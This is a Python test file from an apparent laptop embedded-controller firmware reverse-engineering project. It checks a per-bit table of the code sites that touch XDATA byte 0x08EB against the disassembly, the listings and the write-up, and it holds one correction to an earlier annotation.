#!/usr/bin/env python3
"""The per-bit accounting of XDATA 0x08EB: which site sets, clears and tests
each of its six bits, and the correction of a committed annotation that said
one of them writes the byte (issue #243).

`docs/findings/xdata-08eb-bit-sites.md` is the write-up, and
`ec/annotations/xdata-08eb-bit-sites.csv` is the machine-readable table behind
it: one row per (site, bit), with what `trace_xdata_refs.py` found in
`sweep_access` and what the committed `.asm` listing shows in
`listing_access` kept side by side rather than merged into one corrected
column.

**The load-bearing case is `ThePublishArmDoesNotStoreToThisByte`.** It reads as
a tidy-up of a forwarder's name and is not one. The `ghidra-functions.csv` row
for `0x8931`, and the decompile it was written from, both say the routine's
short arm stages 200 into XDATA 0x08EB. The bytes say the `lcall 0xBB22` that
arm makes ends in the `ret` at 0xBB30 with DPTR pointing at XDATA 0x1809, so
the `movx @DPTR,A` behind it stores there instead. Every other case in this
file would still pass on a firmware where that were wrong -- the site set, the
bit derivations and the listing citations are all independent of it -- so the
claim is held as bytes and against the annotation that now carries the
correction beside the sentence it replaces.

**The per-bit classification is derived, not typed.** `window_facts()` below
re-parses the sweep's own `window` string into `{bit: set|clear|test}` and
`bit_source` is required to be *derivable* from it: a row marked `window` has
to have a bit the window names, with a matching role, and a row marked
`listing` has to have a bit the window does **not** set or clear. That is what
stops a bit list drifting away from the image, and it is why `bit_source` is a
cell to be argued with rather than a label.

Nothing here reads hardware, needs Windows or needs Ghidra: the firmware is the
committed `ec/firmware/GMxMGxx_11.800`, the listings are the committed `.asm`
files, and the one tool this re-runs reads only the image.
"""
import csv
import io
import re
import subprocess
import sys
import unittest
from pathlib import Path

HERE = Path(__file__).parent
REPO = HERE.parent.parent
# disasm8051 and verify_gap_text are imported by bare module name, the way
# test_trace_xdata_refs.py and test_0741_bit7_chain.py do and for the same
# reason.
sys.path.insert(0, str(HERE))

import disasm8051 as D     # noqa: E402
import verify_gap_text as G  # noqa: E402
import yaml                # noqa: E402

FIRMWARE = REPO / 'ec' / 'firmware' / 'GMxMGxx_11.800'
ANNOTATIONS = REPO / 'ec' / 'annotations'
SITES_CSV = ANNOTATIONS / 'xdata-08eb-bit-sites.csv'
FUNCTIONS = ANNOTATIONS / 'ghidra-functions.csv'
RESOLUTION = ANNOTATIONS / 'site-resolution.csv'
REGISTERS = ANNOTATIONS / 'registers.yaml'
WRITEUP = REPO / 'docs' / 'findings' / 'xdata-08eb-bit-sites.md'
TRACE = HERE / 'trace_xdata_refs.py'

ADDR = 0x08EB

# Address == image offset for every program, which is what make_bank_image.py
# arranges and why nothing here does address arithmetic of its own. Loaded once
# rather than per test, for the reason test_0741_bit7_chain.py gives.
IMAGES = G.load_images()

# A committed listing line: address, three byte columns (either two hex digits
# or `-` for a byte past the end of the instruction), the mnemonic, then the
# operands. Split on whitespace instead and a one-byte instruction yields a
# different field count from a three-byte one.
LISTING_LINE = re.compile(
    r'^([0-9A-Fa-f]{4})\s+(?:[0-9a-f]{2}|-)\s+(?:[0-9a-f]{2}|-)\s+'
    r'(?:[0-9a-f]{2}|-)\s+(\S+)(.*)$')

MASK = re.compile(r'\b(anl|orl)\s+a,#0x([0-9a-f]{2})')
BIT_BRANCH = re.compile(r'\b(?:jb|jnb)\s+acc\.(\d)')

# `facts()` names the effect; `role` names the row. `branch` is the row's word
# for what the encoding calls a test, because a test is a branch and the table
# is about what a site does rather than about what an opcode is called.
ROLE_OF_FACT = {'set': 'set', 'clear': 'clear', 'test': 'branch'}


def rows(path):
    with open(path) as f:
        return list(csv.DictReader(f))


_SWEEP = {}


def sweep():
    """The committed sweep's own reading of 0x08EB, keyed by (region, runtime).

    Re-run rather than read from the CSV: the table's two access columns are
    only meaningful against the method that produced one of them, and a table
    checked against itself would agree with a stale transcription indefinitely.

    Cached after the first call. It shells out to `trace_xdata_refs.py`, which
    is the right thing to do once and not once per row -- several of the cases
    below walk the table.
    """
    if not _SWEEP:
        out = subprocess.run(
            [sys.executable, str(TRACE), str(FIRMWARE), '0x%04X' % ADDR,
             '--csv'],
            capture_output=True, text=True, check=True).stdout
        _SWEEP.update({(r['region'], r['runtime']): r
                       for r in csv.DictReader(io.StringIO(out))})
    return _SWEEP


def window_facts(window):
    """-> {bit: 'set'|'clear'|'test'} for the bits a sweep window names.

    Re-derived from the opcodes rather than from the `role` column, which is
    the point: it is the check that a role and a bit in the table still
    describe the bytes. Three shapes, and the third is why an `anl` cannot be
    read one way:

      - `orl a,#0xNN` raises the bits the mask names;
      - `anl a,#0xNN` **dropped** by a following store clears the bits the
        mask does not name;
      - `anl a,#0xNN` whose result a following jump consumes keeps the bits
        the mask names and **tests** them. `0x8931`'s `anl a,#0x48 ; jz` is
        this: 0x48 is the two latch bits, and the `jz` is "both clear?", so
        the bits under test are the ones the mask keeps -- the opposite
        reading from a clear.
    """
    ops = [op.strip() for op in window.split(';')]
    facts = {}
    for i, op in enumerate(ops):
        mask = MASK.search(op)
        if mask:
            value = int(mask.group(2), 16)
            if mask.group(1) == 'orl':
                named = ('set', [b for b in range(8) if value >> b & 1])
            elif i + 1 < len(ops) and ops[i + 1].startswith('j'):
                named = ('test', [b for b in range(8) if value >> b & 1])
            else:
                named = ('clear', [b for b in range(8) if not value >> b & 1])
            for b in named[1]:
                facts[b] = named[0]
            continue
        branch = BIT_BRANCH.search(op)
        if branch:
            facts[int(branch.group(1))] = 'test'
    return facts


def normalise(text):
    """`orl A,#0x04`, `orl  a,#0x04` and `orl a,#0x4` as one string."""
    text = re.sub(r'\s+', ' ', text.strip().lower())
    return re.sub(r'#0x0*([0-9a-f])', r'#0x\1', text)


def decode(image, addr):
    """The one instruction the committed decoder reads at `addr`, as text."""
    for _, _, text in D.decode(image, addr, 1, addr=addr):
        return normalise(text)
    raise AssertionError('nothing decodes at 0x%04X' % addr)


def listing_line(path, addr):
    """The committed `.asm` line at `addr`, as (mnemonic, operands)."""
    for line in path.read_text().splitlines():
        if line[:4].upper() != '%04X' % addr:
            continue
        found = LISTING_LINE.match(line)
        if not found:
            raise AssertionError('%s has no parseable line at 0x%04X: %s'
                                 % (path.name, addr, line))
        return found.group(2).lower(), found.group(3).strip()
    raise AssertionError('%s has no line at 0x%04X' % (path.name, addr))


class TheTableMatchesTheSweep(unittest.TestCase):
    """Both directions, and no literal count.

    `registers.yaml` already carries `static_refs: 21` and nothing here
    repeats it: an expected count turns one changed byte into a red run that
    says nothing, and the claim worth holding is that the table and the sweep
    name the same set of sites.
    """

    def test_every_site_the_sweep_finds_is_in_the_table(self):
        found = {(r['region'], r['runtime']) for r in rows(SITES_CSV)}
        missing = sorted(set(sweep()) - found)
        self.assertFalse(missing, 'the table has no row for %s' % (missing,))

    def test_every_site_in_the_table_is_one_the_sweep_found(self):
        listed = {(r['region'], r['runtime']) for r in rows(SITES_CSV)}
        extra = sorted(listed - set(sweep()))
        self.assertFalse(extra,
                         'the table names %s, which trace_xdata_refs.py does '
                         'not find: it sees direct MOV DPTR sites only, and '
                         'a row it cannot have produced is a transcription '
                         'error rather than a finding' % (extra,))

    def test_the_sweep_access_column_is_the_tools_own_cell(self):
        for row in rows(SITES_CSV):
            key = (row['region'], row['runtime'])
            self.assertEqual(row['sweep_access'], sweep()[key]['access'],
                             '0x%s: sweep_access is not what the tool says'
                             % row['runtime'])

    def test_every_site_lands_in_one_access_reading(self):
        # Both columns are per site, not per row, so a site that the sweep
        # calls a read and the listing calls read+write says so on each of
        # its rows rather than contradicting itself between two of them.
        by_site = {}
        for row in rows(SITES_CSV):
            by_site.setdefault((row['region'], row['runtime']), set()).add(
                row['listing_access'])
        split = sorted(k[1] for k, v in by_site.items() if len(v) > 1)
        self.assertFalse(split, '%s carry two listing_access values' % split)


class TheContainedFunctionMatchesTheJoin(unittest.TestCase):
    """The table's `containing_function` against `site-resolution.csv`.

    That column is transcribed from a generated join rather than derived
    here, so it is the one cell in the table with no other reason to be
    right.
    """

    def test_the_containing_function_is_what_the_join_recorded(self):
        joined = {(r['region'], r['runtime']): r['function']
                  for r in rows(RESOLUTION)
                  if r['register'] == 'XDATA_%04X' % ADDR}
        for row in rows(SITES_CSV):
            key = (row['region'], row['runtime'])
            self.assertEqual(row['containing_function'], joined[key],
                             '0x%s is in a different function now'
                             % row['runtime'])


class TheBitsAreDerived(unittest.TestCase):
    """`bit_source` is derivable, so it cannot be asserted into being right."""

    def test_a_window_row_has_a_bit_the_window_names(self):
        for row in rows(SITES_CSV):
            if row['bit_source'] != 'window':
                continue
            facts = window_facts(sweep()[(row['region'],
                                          row['runtime'])]['window'])
            self.assertIn(int(row['bit']), facts,
                          '0x%s: the sweep window names %s, not bit %s'
                          % (row['runtime'], sorted(facts), row['bit']))

    def test_the_role_is_the_one_those_opcodes_imply(self):
        for row in rows(SITES_CSV):
            facts = window_facts(sweep()[(row['region'],
                                          row['runtime'])]['window'])
            bit = int(row['bit'])
            if row['bit_source'] == 'window':
                self.assertEqual(ROLE_OF_FACT[facts[bit]], row['role'],
                                 '0x%s bit %s: the opcodes say %s and the row '
                                 'says %s' % (row['runtime'], bit,
                                               ROLE_OF_FACT[facts[bit]],
                                               row['role']))

    def test_a_listing_row_is_one_the_window_cannot_set_or_clear(self):
        # This is what makes `bit_source` a derived cell rather than a label.
        # A row marked `listing` exists precisely because the sweep's window
        # does not show the instruction, so if the window did show a set or a
        # clear of that bit the row is mislabelled and one of the two columns
        # is being asked to do the other's job.
        for row in rows(SITES_CSV):
            if row['bit_source'] != 'listing':
                continue
            facts = window_facts(sweep()[(row['region'],
                                          row['runtime'])]['window'])
            bit = int(row['bit'])
            self.assertNotIn(facts.get(bit), ('set', 'clear'),
                             '0x%s bit %s: the window already shows that, so '
                             'the row does not need the listing'
                             % (row['runtime'], bit))

    def test_a_bit_needs_a_writer_a_clearer_or_a_tester(self):
        for row in rows(SITES_CSV):
            self.assertIn(row['role'], ('set', 'clear', 'branch'))

    def test_the_registers_bits_field_and_the_table_agree(self):
        # `bits:` was not moved by this reading, so it has to match the bits
        # the table actually attributes. If a seventh bit turned up in the
        # firmware, or one of the six stopped appearing, one of the two would
        # otherwise be quietly stale.
        entry = next(e for e in yaml.safe_load(REGISTERS.read_text())
                     ['registers'] if e['addr'] == ADDR)
        self.assertEqual(sorted(entry['bits']),
                         sorted({int(r['bit']) for r in rows(SITES_CSV)}))


class EveryInstructionIsInItsCitedEvidence(unittest.TestCase):
    """A row that cites the wrong place would otherwise pass on trust.

    The image check is the stronger of the two and covers every row; the
    listing check covers every row that names one, and is what holds the
    `evidence` cell to the file it names rather than to some listing that
    happens to contain the same instruction.
    """

    def test_the_image_carries_the_opcode_the_row_names(self):
        for row in rows(SITES_CSV):
            decoded = decode(IMAGES[row['region']], int(row['insn_addr'], 16))
            self.assertTrue(decoded.startswith(normalise(row['opcode'])),
                            '0x%s: 0x%s decodes as %r, the row says %r'
                            % (row['runtime'], row['insn_addr'], decoded,
                               row['opcode']))

    def test_the_cited_listing_carries_it_too(self):
        for row in rows(SITES_CSV):
            path = REPO / row['evidence']
            if path.suffix != '.asm':
                continue
            mnemonic, operands = listing_line(path, int(row['insn_addr'], 16))
            wanted = normalise(row['opcode'])
            self.assertEqual(mnemonic, wanted.split(' ')[0],
                             '%s at 0x%s is %s, the row says %s'
                             % (path.name, row['insn_addr'], mnemonic, wanted))
            if '#' in wanted:
                # The listing prints the immediate without a leading zero, so
                # this compares the numbers rather than the spellings.
                self.assertEqual(int(operands.split('#')[1], 16),
                                 int(wanted.split('#')[1], 16),
                                 '%s at 0x%s masks a different value'
                                 % (path.name, row['insn_addr']))
            if 'acc.' in wanted:
                # The listing spells a bit-branch by its bit address, 0xE0
                # being bit 0 of the accumulator; `jnb 0xe7` is `jnb acc.7`.
                bit = int(wanted.split('.')[1])
                self.assertIn('0x%x' % (0xE0 + bit), operands.lower(),
                              '%s at 0x%s does not test bit %d'
                              % (path.name, row['insn_addr'], bit))

    def test_only_the_unexported_sites_cite_the_image(self):
        # `site-resolution.csv` calls 0xC860, 0xC86A and 0xD487 "not
        # exported", so no listing covers them and their evidence is the
        # firmware. Any other row citing the image is claiming a listing does
        # not have. Held as a set equality rather than a count, so a fourth
        # unexported site would change what this says rather than redden it.
        unexported = {r['runtime'] for r in rows(RESOLUTION)
                      if r['register'] == 'XDATA_%04X' % ADDR
                      and r['function'] == 'not exported'}
        from_image = {r['runtime'] for r in rows(SITES_CSV)
                      if not r['evidence'].endswith('.asm')}
        self.assertEqual(from_image, unexported)


class ThePublishArmDoesNotStoreToThisByte(unittest.TestCase):
    """`0x8931`'s short arm stages 200 into XDATA 0x1809, not 0x08EB.

    The `lcall 0xBB22` at `0x8939` is not a stub that returns and leaves DPTR
    alone. `ec/decompiled/bank0/BB22.asm` is one instruction with no `ret`;
    `BB24.asm` and `BB28.asm` continue it and the `ret` is at `0xBB30`, by
    which point DPTR holds 0x1809. So the `movx @DPTR,A` at `0x893E` writes
    there, and the `ljmp 0x8F09` copies 0x1809 -- not this byte -- into
    0x075C.

    Both `ec/decompiled/bank0/8931.c` and the `ghidra-functions.csv` row for
    `0x8931` read the arm as storing into 0x08EB, because the decompiler
    carries the pointer it formed at entry across a call that reloads DPTR.
    The `.asm` header's own rule is that where the two disagree the listing is
    right, so the correction belongs in the annotation and not in the
    generated C.
    """

    PUBLISH = 0xBB22
    RETURN = 0xBB30
    FINAL_DPTR = 0xBB2D

    def test_the_call_leaves_dptr_at_1809(self):
        self.assertEqual(IMAGES['bank0'][self.FINAL_DPTR:self.FINAL_DPTR + 3],
                         bytes((0x90, 0x18, 0x09)),
                         '0xBB2D no longer loads DPTR with 0x1809')
        self.assertEqual(IMAGES['bank0'][self.RETURN], 0x22)

    def test_there_is_no_return_between_the_call_and_that_load(self):
        # One `ret` in the whole sequence, and it is the last byte. A `ret`
        # in the middle would make DPTR's final value the caller's business
        # rather than 0x1809's, and the correction would not follow.
        body = IMAGES['bank0'][self.PUBLISH:self.RETURN + 1]
        decoded = [raw
                   for off, raw, _ in D.decode(IMAGES['bank0'], self.PUBLISH,
                                              16, addr=self.PUBLISH)
                   if off <= self.RETURN]
        self.assertEqual(len([raw for raw in decoded if raw == b'\x22']), 1)
        self.assertEqual(decoded[-1], b'\x22')
        self.assertEqual(sum(len(raw) for raw in decoded), len(body))

    def test_the_store_behind_the_call_writes_through_that_dptr(self):
        self.assertEqual(IMAGES['bank0'][0x893E:0x893F], bytes((0xF0,)),
                         '0x893E is no longer the movx @DPTR,A')
        # And it is the same DPTR: nothing between the call's return and the
        # store reloads it.
        between = IMAGES['bank0'][0xBB30:0x893F]
        self.assertNotIn(b'\x90', between,
                         'a mov DPTR,#nn between the ret and the store would '
                         'make which byte it writes a different question')

    def test_the_tail_jump_copies_1809_into_075c(self):
        self.assertEqual(IMAGES['bank0'][0x8F0A:0x8F0D], bytes((0x90, 0x07, 0x5C)))

    def test_the_table_records_08931_as_a_reader_only(self):
        sites = {(r['region'], r['runtime']) for r in rows(SITES_CSV)
                 if r['runtime'] == '0x8931'}
        self.assertTrue(sites)
        for row in rows(SITES_CSV):
            if row['runtime'] != '0x8931':
                continue
            self.assertEqual(row['role'], 'branch')
            self.assertEqual(row['listing_access'], 'read')
        self.assertEqual({int(r['bit']) for r in rows(SITES_CSV)
                          if r['runtime'] == '0x8931'}, {3, 6})

    def test_the_annotation_keeps_the_wrong_sentence_and_the_correction(self):
        # CLAUDE.md's retraction rule: the version that was wrong stays
        # readable with the correction next to it. A cell that simply stopped
        # saying "into 0x08EB" would hide that this repository once read it
        # that way, which is the part a reader needs.
        comment = next(r['comment'] for r in rows(FUNCTIONS)
                       if r['scope'] == 'bank0' and r['addr'].upper() == '0X8931')
        self.assertIn('the arm stages 0xC8 into 0x08EB', comment)
        self.assertIn('it is wrong', comment)
        self.assertIn('0x1809', comment)
        self.assertIn('docs/findings/xdata-08eb-bit-sites.md', comment)


class TheRegisterEntrySaysSo(unittest.TestCase):
    """The drift guard between the machine-readable table and the entry.

    A site could fall out of the note while the table still carries it, and
    the entry would then read as covering less than it does. The status is
    for something this reading cannot establish, so it is asserted unchanged
    rather than allowed to drift with everything else.
    """

    NOTE = None

    @classmethod
    def setUpClass(cls):
        with open(REGISTERS) as f:
            cls.NOTE = next(e for e in yaml.safe_load(f)['registers']
                            if e['addr'] == ADDR)

    def test_the_entry_is_still_present_untested(self):
        self.assertEqual(self.NOTE['status'], 'present-untested')

    def test_the_note_names_every_site_the_table_carries(self):
        # The note spells addresses in the upper case the rest of the file
        # uses, so the match is case-insensitive rather than a set difference
        # between two spellings of the same number.
        named = {m.lower() for m in
                 re.findall(r'0x[0-9a-f]{4}', self.NOTE['note'], re.I)}
        missing = sorted({r['runtime'].lower() for r in rows(SITES_CSV)} - named)
        self.assertFalse(missing, 'the note no longer names %s' % (missing,))

    def test_the_note_points_at_the_table_and_the_writeup(self):
        self.assertIn('xdata-08eb-bit-sites.csv', self.NOTE['note'])
        self.assertIn('docs/findings/xdata-08eb-bit-sites.md', self.NOTE['note'])

    def test_the_note_still_says_a_store_is_not_the_ec_acting(self):
        self.assertIn('Nothing is read back', self.NOTE['note'])
        self.assertIn('not the same claim', self.NOTE['note'])

    def test_the_two_access_columns_are_not_merged_into_one(self):
        # The distinction #224 drew and CLAUDE.md's calibration rule rests on:
        # "not reached by this reading" is not "no site this method finds",
        # and a table with one corrected access column cannot say which.
        self.assertEqual(sorted(SITES_CSV.read_text().splitlines()[0].split(',')),
                         sorted(['bit', 'runtime', 'region',
                                 'containing_function', 'role', 'bit_source',
                                 'insn_addr', 'opcode', 'sweep_access',
                                 'listing_access', 'evidence']))


class TheWriteUpStaysCalibrated(unittest.TestCase):
    """The prose is held to the same standard as the table.

    A negative here would be stronger than any method in the tree supports:
    the sweep sees only direct `MOV DPTR` sites, and the indirect scan that
    would cover the rest was not run. So both negatives are named and kept
    apart, and the wording is held rather than left to a reader's charity.
    """

    TEXT = None

    @classmethod
    def setUpClass(cls):
        cls.TEXT = WRITEUP.read_text()

    def test_it_says_nothing_was_measured_on_hardware(self):
        self.assertIn('Nothing here is a live observation', self.TEXT)

    def test_it_keeps_the_two_negatives_apart(self):
        self.assertIn('not reached by this reading', self.TEXT)
        self.assertIn('no site this method finds', self.TEXT)

    def test_it_does_not_claim_the_byte_has_no_writer(self):
        self.assertNotIn('has no writer', self.TEXT)
        self.assertIn('was not run here', self.TEXT)

    def test_it_states_the_three_sites_where_the_methods_disagree(self):
        # Named rather than counted: a count is the sort of figure that goes
        # stale, and these three are the cases a reader has to adjudicate.
        for site in ('0xB489', '0xCD34', '0xCCB7'):
            self.assertIn(site, self.TEXT)

    def test_it_leaves_the_retraction_visible(self):
        self.assertIn('wrong', self.TEXT)
        self.assertIn('not one of them', self.TEXT)

    def test_it_names_what_it_did_not_follow(self):
        self.assertIn('Follow-ups', self.TEXT)
        self.assertIn('bit 1 of `0x0490`', self.TEXT)


if __name__ == '__main__':
    unittest.main()
